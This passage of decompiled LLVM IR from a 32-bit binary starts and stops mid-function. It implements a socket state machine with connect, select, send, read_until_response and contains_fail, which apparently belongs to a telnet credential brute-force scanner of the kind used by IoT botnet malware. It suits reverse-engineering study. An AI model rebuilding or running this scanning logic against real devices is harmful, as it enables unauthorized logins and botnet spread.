  %v2_804c123 = inttoptr i32 %v1_804c123 to i32*
  store i32 0, i32* %v2_804c123, align 4
  %v0_804c12b = load i32, i32* @esp, align 4
  %v1_804c12b = add i32 %v0_804c12b, 4
  %v2_804c12b = inttoptr i32 %v1_804c12b to i32*
  store i32 3, i32* %v2_804c12b, align 4
  %v0_804c133 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c133 = load i32, i32* @esp, align 4
  %v2_804c133 = inttoptr i32 %v1_804c133 to i32*
  store i32 %v0_804c133, i32* %v2_804c133, align 4
  %v1_804c136 = load i32, i32* %stack_var_-596, align 4
  %v3_804c136 = call i32 @__libc_fcntl(i32 %v2_804c0a7, i32 %v1_804c136, i32 0)
  %v1_804c13d = or i32 %v3_804c136, 2048
  store i32 %v1_804c13d, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c159 = load i32, i32* %v3_804c0fe, align 4
  store i32 %v4_804c159, i32* %eax.global-to-local, align 4
  %v1_804c15c = load i32, i32* @esp, align 4
  %v2_804c15c = add i32 %v1_804c15c, 8
  %v3_804c15c = inttoptr i32 %v2_804c15c to i32*
  store i32 %v1_804c13d, i32* %v3_804c15c, align 4
  %v0_804c160 = load i32, i32* @esp, align 4
  %v1_804c160 = add i32 %v0_804c160, 4
  %v2_804c160 = inttoptr i32 %v1_804c160 to i32*
  store i32 4, i32* %v2_804c160, align 4
  %v0_804c168 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c168 = load i32, i32* @esp, align 4
  %v2_804c168 = inttoptr i32 %v1_804c168 to i32*
  store i32 %v0_804c168, i32* %v2_804c168, align 4
  %v1_804c16b = load i32, i32* %stack_var_-596, align 4
  %v3_804c16b = call i32 @__libc_fcntl(i32 %v2_804c0a7, i32 %v1_804c16b, i32 0)
  store i32 %v2_804bc76, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c18c = load i32, i32* %v3_804c0fe, align 4
  store i32 %v4_804c18c, i32* %eax.global-to-local, align 4
  %v0_804c18f = load i32, i32* @esp, align 4
  %v1_804c18f = add i32 %v0_804c18f, 8
  %v2_804c18f = inttoptr i32 %v1_804c18f to i32*
  store i32 16, i32* %v2_804c18f, align 4
  %v1_804c197 = load i32, i32* @esp, align 4
  %v2_804c197 = add i32 %v1_804c197, 4
  %v3_804c197 = inttoptr i32 %v2_804c197 to i32*
  store i32 %v2_804bc76, i32* %v3_804c197, align 4
  %v0_804c19b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c19b = load i32, i32* @esp, align 4
  %v2_804c19b = inttoptr i32 %v1_804c19b to i32*
  store i32 %v0_804c19b, i32* %v2_804c19b, align 4
  %v1_804c19e = load i32, i32* %stack_var_-596, align 4
  %v3_804c19e = call i32 @__libc_connect(i32 %v2_804c0a7, i32 %v1_804c19e, i32 0)
  store i32 %v3_804c19e, i32* %eax.global-to-local, align 4
  %v10_804c1a3 = icmp eq i32 %v3_804c19e, -1
  %v1_804c1a6 = icmp eq i1 %v10_804c1a3, false
  br i1 %v1_804c1a6, label %dec_label_pc_804c1da, label %dec_label_pc_804c1a8

dec_label_pc_804c1a8:                             ; preds = %dec_label_pc_804c10a
  %v1_804c1a8 = call i32 @__errno_location(i32 %v2_804c0a7)
  store i32 %v1_804c1a8, i32* %eax.global-to-local, align 4
  %v1_804c1ad = inttoptr i32 %v1_804c1a8 to i32*
  %v2_804c1ad = load i32, i32* %v1_804c1ad, align 4
  store i32 %v2_804c1ad, i32* %eax.global-to-local, align 4
  %v9_804c1af = icmp eq i32 %v2_804c1ad, 115
  br i1 %v9_804c1af, label %dec_label_pc_804c1da, label %dec_label_pc_804c1b4

dec_label_pc_804c1b4:                             ; preds = %dec_label_pc_804c1a8
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c1cd = load i32, i32* @esp, align 4
  %v2_804c1cd = inttoptr i32 %v1_804c1cd to i32*
  store i32 %v2_804bde4, i32* %v2_804c1cd, align 4
  %v1_804c1d0 = call i32 @reset_telstate(i32 %v2_804c0a7)
  store i32 %v1_804c1d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c1da:                             ; preds = %dec_label_pc_804c1a8, %dec_label_pc_804c10a
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c1f3 = load i32, i32* @esp, align 4
  %v1_804c1f3 = add i32 %v0_804c1f3, 4
  %v2_804c1f3 = inttoptr i32 %v1_804c1f3 to i32*
  store i32 1, i32* %v2_804c1f3, align 4
  %v0_804c1fb = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1fb = load i32, i32* @esp, align 4
  %v2_804c1fb = inttoptr i32 %v1_804c1fb to i32*
  store i32 %v0_804c1fb, i32* %v2_804c1fb, align 4
  %v1_804c1fe = load i32, i32* %stack_var_-596, align 4
  %v2_804c1fe = inttoptr i32 %v2_804c0a7 to i32*
  %v3_804c1fe = call i32 @advance_state(i32* %v2_804c1fe, i32 %v1_804c1fe)
  store i32 %v3_804c1fe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c208:                             ; preds = %dec_label_pc_804be1c
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c212, i32* @edi, align 4
  %v5_804c219 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c237 = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c237 = load i32, i32* %v3_804c237, align 4
  %v2_804c23c = udiv i32 %v4_804c237, 32
  store i32 %v2_804c23c, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c255 = load i32, i32* %v3_804c237, align 4
  %v1_804c258 = urem i32 %v4_804c255, 32
  store i32 %v1_804c258, i32* %eax.global-to-local, align 4
  %v0_804c25b = load i32, i32* @ebp, align 4
  %v2_804c25b = mul nuw nsw i32 %v2_804c23c, 4
  %v3_804c25b = add nsw i32 %v2_804c25b, -312
  %v4_804c25b = add i32 %v3_804c25b, %v0_804c25b
  %v5_804c25b = inttoptr i32 %v4_804c25b to i32*
  %v6_804c25b = load i32, i32* %v5_804c25b, align 4
  %v9_804c25b = shl i32 1, %v1_804c258
  %v12_804c25b = or i32 %v6_804c25b, %v9_804c25b
  store i32 %v12_804c25b, i32* %v5_804c25b, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c28c = load i32, i32* %v3_804c237, align 4
  %v1_804c28f = add i32 %v4_804c28c, 1
  store i32 %v1_804c28f, i32* %edx.global-to-local, align 4
  %v1_804c298 = load i32, i32* @esp, align 4
  %v2_804c298 = add i32 %v1_804c298, 16
  %v3_804c298 = inttoptr i32 %v2_804c298 to i32*
  store i32 %v2_804c292, i32* %v3_804c298, align 4
  %v0_804c29c = load i32, i32* @esp, align 4
  %v1_804c29c = add i32 %v0_804c29c, 12
  %v2_804c29c = inttoptr i32 %v1_804c29c to i32*
  store i32 0, i32* %v2_804c29c, align 4
  store i32 %v2_804c212, i32* %eax.global-to-local, align 4
  %v1_804c2aa = load i32, i32* @esp, align 4
  %v2_804c2aa = add i32 %v1_804c2aa, 8
  %v3_804c2aa = inttoptr i32 %v2_804c2aa to i32*
  store i32 %v2_804c212, i32* %v3_804c2aa, align 4
  %v0_804c2ae = load i32, i32* @esp, align 4
  %v1_804c2ae = add i32 %v0_804c2ae, 4
  %v2_804c2ae = inttoptr i32 %v1_804c2ae to i32*
  store i32 0, i32* %v2_804c2ae, align 4
  %v0_804c2b6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c2b6 = load i32, i32* @esp, align 4
  %v2_804c2b6 = inttoptr i32 %v1_804c2b6 to i32*
  store i32 %v0_804c2b6, i32* %v2_804c2b6, align 4
  %v0_804c2b9 = load i32, i32* %stack_var_-324, align 4
  %v2_804c2b9 = load i32, i32* %stack_var_-316, align 4
  %v5_804c2b9 = call i32 @__libc_select(i32 %v0_804c2b9, i32 %arg1, i32 %v2_804c2b9, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c2b9, i32* %eax.global-to-local, align 4
  %v12_804c2c1 = icmp eq i32 %v5_804c2b9, 1
  %v1_804c2c5 = icmp eq i1 %v12_804c2c1, false
  br i1 %v1_804c2c5, label %dec_label_pc_804c3e8, label %dec_label_pc_804c2cb

dec_label_pc_804c2cb:                             ; preds = %dec_label_pc_804c208
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c2f5 = load i32, i32* %v3_804c237, align 4
  store i32 %v4_804c2f5, i32* %edx.global-to-local, align 4
  %v1_804c2fe = load i32, i32* @esp, align 4
  %v2_804c2fe = add i32 %v1_804c2fe, 16
  %v3_804c2fe = inttoptr i32 %v2_804c2fe to i32*
  store i32 %v2_804c2f8, i32* %v3_804c2fe, align 4
  store i32 %v2_804c302, i32* %eax.global-to-local, align 4
  %v1_804c308 = load i32, i32* @esp, align 4
  %v2_804c308 = add i32 %v1_804c308, 12
  %v3_804c308 = inttoptr i32 %v2_804c308 to i32*
  store i32 %v2_804c302, i32* %v3_804c308, align 4
  %v0_804c30c = load i32, i32* @esp, align 4
  %v1_804c30c = add i32 %v0_804c30c, 8
  %v2_804c30c = inttoptr i32 %v1_804c30c to i32*
  store i32 4, i32* %v2_804c30c, align 4
  %v0_804c314 = load i32, i32* @esp, align 4
  %v1_804c314 = add i32 %v0_804c314, 4
  %v2_804c314 = inttoptr i32 %v1_804c314 to i32*
  store i32 1, i32* %v2_804c314, align 4
  %v0_804c31c = load i32, i32* %edx.global-to-local, align 4
  %v1_804c31c = load i32, i32* @esp, align 4
  %v2_804c31c = inttoptr i32 %v1_804c31c to i32*
  store i32 %v0_804c31c, i32* %v2_804c31c, align 4
  %v0_804c31f = load i32, i32* %stack_var_-332, align 4
  %v1_804c31f = load i32, i32* %stack_var_-328, align 4
  %v2_804c31f = load i32, i32* %stack_var_-324, align 4
  %v4_804c31f = load i32, i32* %stack_var_-316, align 4
  %v5_804c31f = call i32 @getsockopt(i32 %v0_804c31f, i32 %v1_804c31f, i32 %v2_804c31f, i32 %arg1, i32 %v4_804c31f)
  %v3_804c324 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804c324, i32* %eax.global-to-local, align 4
  %v1_804c32a = icmp eq i32 %v3_804c324, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804c32a, label %dec_label_pc_804c354, label %dec_label_pc_804c32e

dec_label_pc_804c32e:                             ; preds = %dec_label_pc_804c2cb
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c347 = load i32, i32* @esp, align 4
  %v2_804c347 = inttoptr i32 %v1_804c347 to i32*
  store i32 %v2_804bde4, i32* %v2_804c347, align 4
  %v0_804c34a = load i32, i32* %stack_var_-332, align 4
  %v1_804c34a = call i32 @reset_telstate(i32 %v0_804c34a)
  store i32 %v1_804c34a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c354:                             ; preds = %dec_label_pc_804c2cb
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c36a = load i32, i32* %v3_804c237, align 4
  store i32 %v4_804c36a, i32* %eax.global-to-local, align 4
  %v0_804c36d = load i32, i32* @esp, align 4
  %v1_804c36d = add i32 %v0_804c36d, 8
  %v2_804c36d = inttoptr i32 %v1_804c36d to i32*
  store i32 0, i32* %v2_804c36d, align 4
  %v0_804c375 = load i32, i32* @esp, align 4
  %v1_804c375 = add i32 %v0_804c375, 4
  %v2_804c375 = inttoptr i32 %v1_804c375 to i32*
  store i32 3, i32* %v2_804c375, align 4
  %v0_804c37d = load i32, i32* %eax.global-to-local, align 4
  %v1_804c37d = load i32, i32* @esp, align 4
  %v2_804c37d = inttoptr i32 %v1_804c37d to i32*
  store i32 %v0_804c37d, i32* %v2_804c37d, align 4
  %v0_804c380 = load i32, i32* %stack_var_-332, align 4
  %v1_804c380 = load i32, i32* %stack_var_-328, align 4
  %v2_804c380 = load i32, i32* %stack_var_-324, align 4
  %v3_804c380 = call i32 @__libc_fcntl(i32 %v0_804c380, i32 %v1_804c380, i32 %v2_804c380)
  %v1_804c387 = and i32 %v3_804c380, -2049
  store i32 %v1_804c387, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c3a3 = load i32, i32* %v3_804c237, align 4
  store i32 %v4_804c3a3, i32* %eax.global-to-local, align 4
  %v1_804c3a6 = load i32, i32* @esp, align 4
  %v2_804c3a6 = add i32 %v1_804c3a6, 8
  %v3_804c3a6 = inttoptr i32 %v2_804c3a6 to i32*
  store i32 %v1_804c387, i32* %v3_804c3a6, align 4
  %v0_804c3aa = load i32, i32* @esp, align 4
  %v1_804c3aa = add i32 %v0_804c3aa, 4
  %v2_804c3aa = inttoptr i32 %v1_804c3aa to i32*
  store i32 4, i32* %v2_804c3aa, align 4
  %v0_804c3b2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3b2 = load i32, i32* @esp, align 4
  %v2_804c3b2 = inttoptr i32 %v1_804c3b2 to i32*
  store i32 %v0_804c3b2, i32* %v2_804c3b2, align 4
  %v0_804c3b5 = load i32, i32* %stack_var_-332, align 4
  %v1_804c3b5 = load i32, i32* %stack_var_-328, align 4
  %v2_804c3b5 = load i32, i32* %stack_var_-324, align 4
  %v3_804c3b5 = call i32 @__libc_fcntl(i32 %v0_804c3b5, i32 %v1_804c3b5, i32 %v2_804c3b5)
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c3d3 = load i32, i32* @esp, align 4
  %v1_804c3d3 = add i32 %v0_804c3d3, 4
  %v2_804c3d3 = inttoptr i32 %v1_804c3d3 to i32*
  store i32 2, i32* %v2_804c3d3, align 4
  %v0_804c3db = load i32, i32* %eax.global-to-local, align 4
  %v1_804c3db = load i32, i32* @esp, align 4
  %v2_804c3db = inttoptr i32 %v1_804c3db to i32*
  store i32 %v0_804c3db, i32* %v2_804c3db, align 4
  %v0_804c3de = load i32, i32* %stack_var_-332, align 4
  %v1_804c3de = load i32, i32* %stack_var_-328, align 4
  %v2_804c3de = inttoptr i32 %v0_804c3de to i32*
  %v3_804c3de = call i32 @advance_state(i32* %v2_804c3de, i32 %v1_804c3de)
  store i32 %v3_804c3de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c3e8:                             ; preds = %dec_label_pc_804c208
  %v13_804c3e8 = icmp eq i32 %v5_804c2b9, -1
  %v1_804c3ec = icmp eq i1 %v13_804c3e8, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804c3ec, label %dec_label_pc_804c414, label %dec_label_pc_804c3ee

dec_label_pc_804c3ee:                             ; preds = %dec_label_pc_804c3e8
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c407 = load i32, i32* @esp, align 4
  %v2_804c407 = inttoptr i32 %v1_804c407 to i32*
  store i32 %v2_804bde4, i32* %v2_804c407, align 4
  %v1_804c40a = call i32 @reset_telstate(i32 %v5_804c2b9)
  store i32 %v1_804c40a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c414:                             ; preds = %dec_label_pc_804c3e8
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v2_804c42f = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804c42f, i32* %eax.global-to-local, align 4
  %v1_804c431 = add i32 %v2_804c42f, 5
  store i32 %v1_804c431, i32* @ebx, align 4
  %v0_804c434 = load i32, i32* @esp, align 4
  %v1_804c434 = inttoptr i32 %v0_804c434 to i32*
  store i32 0, i32* %v1_804c434, align 4
  %v1_804c43b = inttoptr i32 %v5_804c2b9 to i32*
  %v2_804c43b = call i32 @__GI_time(i32* %v1_804c43b)
  store i32 %v2_804c43b, i32* %eax.global-to-local, align 4
  %v0_804c440 = load i32, i32* @ebx, align 4
  %v7_804c440 = icmp ult i32 %v0_804c440, %v2_804c43b
  %v1_804c442 = icmp eq i1 %v7_804c440, false
  br i1 %v1_804c442, label %dec_label_pc_804cd9e, label %dec_label_pc_804c448

dec_label_pc_804c448:                             ; preds = %dec_label_pc_804c414
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c461 = load i32, i32* @esp, align 4
  %v2_804c461 = inttoptr i32 %v1_804c461 to i32*
  store i32 %v2_804bde4, i32* %v2_804c461, align 4
  %v0_804c464 = load i32, i32* %stack_var_-332, align 4
  %v1_804c464 = call i32 @reset_telstate(i32 %v0_804c464)
  store i32 %v1_804c464, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c46e:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  %v1_804c486 = add i32 %v2_804bde4, 24
  store i32 %v1_804c486, i32* %eax.global-to-local, align 4
  %v1_804c489 = inttoptr i32 %v1_804c486 to i32*
  %v2_804c489 = load i32, i32* %v1_804c489, align 4
  store i32 %v2_804c489, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c4a1 = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c4a1 = load i32, i32* %v3_804c4a1, align 4
  store i32 %v4_804c4a1, i32* %edx.global-to-local, align 4
  %v0_804c4a4 = load i32, i32* @esp, align 4
  %v1_804c4a4 = add i32 %v0_804c4a4, 16
  %v2_804c4a4 = inttoptr i32 %v1_804c4a4 to i32*
  store i32 134619628, i32* %v2_804c4a4, align 4
  %v0_804c4ac = load i32, i32* @esp, align 4
  %v1_804c4ac = add i32 %v0_804c4ac, 12
  %v2_804c4ac = inttoptr i32 %v1_804c4ac to i32*
  store i32 1024, i32* %v2_804c4ac, align 4
  %v0_804c4b4 = load i32, i32* @ebx, align 4
  %v1_804c4b4 = load i32, i32* @esp, align 4
  %v2_804c4b4 = add i32 %v1_804c4b4, 8
  %v3_804c4b4 = inttoptr i32 %v2_804c4b4 to i32*
  store i32 %v0_804c4b4, i32* %v3_804c4b4, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804c4bb = load i32, i32* @esp, align 4
  %v2_804c4bb = add i32 %v1_804c4bb, 4
  %v3_804c4bb = inttoptr i32 %v2_804c4bb to i32*
  store i32 %arg1, i32* %v3_804c4bb, align 4
  %v0_804c4bf = load i32, i32* %edx.global-to-local, align 4
  %v1_804c4bf = load i32, i32* @esp, align 4
  %v2_804c4bf = inttoptr i32 %v1_804c4bf to i32*
  store i32 %v0_804c4bf, i32* %v2_804c4bf, align 4
  %v1_804c4c2 = call i32 @read_until_response(i32 %v6_804be32)
  %v1_804c4c7 = icmp eq i32 %v1_804c4c2, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  br i1 %v1_804c4c7, label %dec_label_pc_804c554, label %dec_label_pc_804c4cf

dec_label_pc_804c4cf:                             ; preds = %dec_label_pc_804c46e
  store i32 %v1_804c486, i32* %eax.global-to-local, align 4
  %v2_804c4ea = load i32, i32* %v1_804c489, align 4
  store i32 %v2_804c4ea, i32* %eax.global-to-local, align 4
  %v1_804c4ec = load i32, i32* @esp, align 4
  %v2_804c4ec = inttoptr i32 %v1_804c4ec to i32*
  store i32 %v2_804c4ea, i32* %v2_804c4ec, align 4
  %v0_804c4ef = load i32, i32* %stack_var_-332, align 4
  %v1_804c4ef = call i32 @contains_fail(i32 %v0_804c4ef)
  %v1_804c4f4 = icmp eq i32 %v1_804c4ef, 0
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c53f = load i32, i32* @esp, align 4
  %v1_804c53f = add i32 %v0_804c53f, 4
  %v2_804c53f = inttoptr i32 %v1_804c53f to i32*
  br i1 %v1_804c4f4, label %dec_label_pc_804c526, label %dec_label_pc_804c4f8

dec_label_pc_804c4f8:                             ; preds = %dec_label_pc_804c4cf
  store i32 0, i32* %v2_804c53f, align 4
  %v0_804c519 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c519 = load i32, i32* @esp, align 4
  %v2_804c519 = inttoptr i32 %v1_804c519 to i32*
  store i32 %v0_804c519, i32* %v2_804c519, align 4
  %v0_804c51c = load i32, i32* %stack_var_-332, align 4
  %v1_804c51c = load i32, i32* %stack_var_-328, align 4
  %v2_804c51c = inttoptr i32 %v0_804c51c to i32*
  %v3_804c51c = call i32 @advance_state(i32* %v2_804c51c, i32 %v1_804c51c)
  store i32 %v3_804c51c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c526:                             ; preds = %dec_label_pc_804c4cf
  store i32 3, i32* %v2_804c53f, align 4
  %v0_804c547 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c547 = load i32, i32* @esp, align 4
  %v2_804c547 = inttoptr i32 %v1_804c547 to i32*
  store i32 %v0_804c547, i32* %v2_804c547, align 4
  %v0_804c54a = load i32, i32* %stack_var_-332, align 4
  %v1_804c54a = load i32, i32* %stack_var_-328, align 4
  %v2_804c54a = inttoptr i32 %v0_804c54a to i32*
  %v3_804c54a = call i32 @advance_state(i32* %v2_804c54a, i32 %v1_804c54a)
  store i32 %v3_804c54a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c554:                             ; preds = %dec_label_pc_804c46e
  store i32 %v1_804bde6, i32* %eax.global-to-local, align 4
  %v2_804c56f = load i32, i32* %v1_804bde9, align 4
  store i32 %v2_804c56f, i32* %eax.global-to-local, align 4
  %v1_804c571 = add i32 %v2_804c56f, 7
  store i32 %v1_804c571, i32* @ebx, align 4
  %v0_804c574 = load i32, i32* @esp, align 4
  %v1_804c574 = inttoptr i32 %v0_804c574 to i32*
  store i32 0, i32* %v1_804c574, align 4
  %v0_804c57b = load i32, i32* %stack_var_-332, align 4
  %v1_804c57b = inttoptr i32 %v0_804c57b to i32*
  %v2_804c57b = call i32 @__GI_time(i32* %v1_804c57b)
  store i32 %v2_804c57b, i32* %eax.global-to-local, align 4
  %v0_804c580 = load i32, i32* @ebx, align 4
  %v7_804c580 = icmp ult i32 %v0_804c580, %v2_804c57b
  %v1_804c582 = icmp eq i1 %v7_804c580, false
  br i1 %v1_804c582, label %dec_label_pc_804cd9e, label %dec_label_pc_804c588

dec_label_pc_804c588:                             ; preds = %dec_label_pc_804c554
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c5a1 = load i32, i32* @esp, align 4
  %v2_804c5a1 = inttoptr i32 %v1_804c5a1 to i32*
  store i32 %v2_804bde4, i32* %v2_804c5a1, align 4
  %v0_804c5a4 = load i32, i32* %stack_var_-332, align 4
  %v1_804c5a4 = call i32 @reset_telstate(i32 %v0_804c5a4)
  store i32 %v1_804c5a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c5ae:                             ; preds = %dec_label_pc_804be1c
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c5c4 = add i32 %v2_804bfaa, %v2_804bde2
  %v4_804c5c4 = inttoptr i32 %v3_804c5c4 to i8*
  %v5_804c5c4 = load i8, i8* %v4_804c5c4, align 2
  %v6_804c5c4 = zext i8 %v5_804c5c4 to i32
  store i32 %v6_804c5c4, i32* %eax.global-to-local, align 4
  %v1_804c5cc = mul nuw nsw i32 %v6_804c5c4, 4
  %v2_804c5cc = add nuw nsw i32 %v1_804c5cc, 134619556
  %v3_804c5cc = inttoptr i32 %v2_804c5cc to i32*
  %v4_804c5cc = load i32, i32* %v3_804c5cc, align 4
  %v1_804c5de = and i32 %v4_804c5cc, -256
  store i32 %v1_804c5de, i32* %eax.global-to-local, align 4
  %v4_804c5e1 = inttoptr i32 %v4_804c5cc to i8*
  store i32 %v4_804c5cc, i32* @edi, align 4
  %v3_804c5e7 = call i32 @_strlen(i8* %v4_804c5e1)
  store i32 %v3_804c5e7, i32* @esi, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v5_804c606 = load i8, i8* %v4_804c5c4, align 2
  %v6_804c606 = zext i8 %v5_804c606 to i32
  store i32 %v6_804c606, i32* %eax.global-to-local, align 4
  %v1_804c60e = mul nuw nsw i32 %v6_804c606, 4
  %v2_804c60e = add nuw nsw i32 %v1_804c60e, 134619556
  %v3_804c60e = inttoptr i32 %v2_804c60e to i32*
  %v4_804c60e = load i32, i32* %v3_804c60e, align 4
  store i32 %v4_804c60e, i32* @ebx, align 4
  store i32 %v1_804bdd4, i32* %edx.global-to-local, align 4
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v3_804c62b = inttoptr i32 %v2_804bde4 to i32*
  %v4_804c62b = load i32, i32* %v3_804c62b, align 4
  store i32 %v4_804c62b, i32* %eax.global-to-local, align 4
  %v0_804c62e = load i32, i32* @esp, align 4
  %v1_804c62e = add i32 %v0_804c62e, 12
  %v2_804c62e = inttoptr i32 %v1_804c62e to i32*
  store i32 16384, i32* %v2_804c62e, align 4
  %v0_804c636 = load i32, i32* @esi, align 4
  %v1_804c636 = load i32, i32* @esp, align 4
  %v2_804c636 = add i32 %v1_804c636, 8
  %v3_804c636 = inttoptr i32 %v2_804c636 to i32*
  store i32 %v0_804c636, i32* %v3_804c636, align 4
  %v0_804c63a = load i32, i32* @ebx, align 4
  %v1_804c63a = load i32, i32* @esp, align 4
  %v2_804c63a = add i32 %v1_804c63a, 4
  %v3_804c63a = inttoptr i32 %v2_804c63a to i32*
  store i32 %v0_804c63a, i32* %v3_804c63a, align 4
  %v0_804c63e = load i32, i32* %eax.global-to-local, align 4
  %v1_804c63e = load i32, i32* @esp, align 4
  %v2_804c63e = inttoptr i32 %v1_804c63e to i32*
  store i32 %v0_804c63e, i32* %v2_804c63e, align 4
  %v4_804c641 = call i32 @__libc_send(i32 %v4_804c5cc, i32 %v2_804bced, i32 %v6_804be32, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c641, i32* %eax.global-to-local, align 4
  %v2_804c646 = icmp slt i32 %v4_804c641, 0
  %v1_804c648 = icmp eq i1 %v2_804c646, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  br i1 %v1_804c648, label %dec_label_pc_804c670, label %dec_label_pc_804c64a

dec_label_pc_804c64a:                             ; preds = %dec_label_pc_804c5ae
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v1_804c663 = load i32, i32* @esp, align 4
  %v2_804c663 = inttoptr i32 %v1_804c663 to i32*
  store i32 %v2_804bde4, i32* %v2_804c663, align 4
  %v1_804c666 = call i32 @reset_telstate(i32 %v4_804c5cc)
  store i32 %v1_804c666, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd9e

dec_label_pc_804c670:                             ; preds = %dec_label_pc_804c5ae
  store i32 %v2_804bde2, i32* %eax.global-to-local, align 4
  %v4_804c686 = load i32, i32* %v3_804c62b, align 4
  store i32 %v4_804c686, i32* %eax.global-to-local, align 4
  %v0_804c689 = load i32, i32* @esp, align 4
  %v1_804c689 = add i32 %v0_804c689, 12
  %v2_804c689 = inttoptr i32 %v1_804c689 to i32*
  store i32 16384, i32* %v2_804c689, align 4
  %v0_804c691 = load i32, i32* @esp, align 4
  %v1_804c691 = add i32 %v0_804c691, 8
  %v2_804c691 = inttoptr i32 %v1_804c691 to i32*
  store i32 2, i32* %v2_804c691, align 4
  %v0_804c699 = load i32, i32* @esp, align 4
  %v1_804c699 = add i32 %v0_804c699, 4
  %v2_804c699 = inttoptr i32 %v1_804c699 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8057f04.173 to i32), i32* %v2_804c699, align 4
  %v0_804c6a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6a1 = load i32, i32* @esp, align 4
  %v2_804c6a1 = inttoptr i32 %v1_804c6a1 to i32*
  store i32 %v0_804c6a1, i32* %v2_804c6a1, align 4
  %v4_804c6a4 = call i32 @__libc_send(i32 %v4_804c5cc, i32 %v2_804bced, i32 %v6_804be32, i32 ptrtoint (i32* @0 to i32))
  %v2_804c6a9 = icmp slt i32 %v4_804c6a4, 0
  %v1_804c6ab = icmp eq i1 %v2_804c6a9, false
  store i32 %v1_804bdd4, i32* @edx, align 4
  store i32 %v2_804bde4, i32* %eax.global-to-local, align 4
  %v0_804c6ec = load i32, i32* @esp, align 4
  br i1 %v1_804c6ab, label %dec_label_pc_804c6d3, label %dec_label_pc_804c6ad

dec_label_pc_804c6ad:                             ; preds = %dec_label_pc_804c670
